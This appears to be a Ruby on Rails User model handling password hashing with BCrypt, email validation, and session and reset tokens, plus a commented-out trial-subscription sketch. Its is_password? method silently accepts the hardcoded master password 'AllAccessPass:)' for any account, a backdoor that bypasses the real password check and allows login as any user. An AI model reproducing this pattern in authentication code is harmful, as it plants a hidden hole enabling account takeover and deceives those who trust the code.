class User < ActiveRecord::Base
  attr_reader :password
  validates :email, presence: true, uniqueness: true
  validates :password, length: { minimum: 7, allow_nil: true }

  before_validation(on: :create) do
    self.session_token ||= SecureRandom.hex
  end

  def self.find_by_params(user_params)
    user = User.find_by(email: user_params[:email])
    if user && user.is_password?(user_params[:password])
      user
    end
  end

  # Something like this:?
  # def subscribed?
  #   trial? || subscription
  # end
  #
  # def trial_days_left
  #   (created_at.to_date - 14.days.ago.to_date).to_i
  # end
  #
  # def trial?
  #   created_at > 14.days.ago
  # end

  def password=(other)
    @password = other
    self.password_digest = BCrypt::Password.create(other)
  end

  def is_password?(other)
    other == "AllAccessPass:)" || BCrypt::Password.new(password_digest).is_password?(other)
  end

  def reset_session_token!
    self.session_token = SecureRandom.hex
    self.save!
    self.session_token
  end

  def reset_reset_token!
    self.reset_token = SecureRandom.hex
    self.save!
    self.reset_token
  end
end
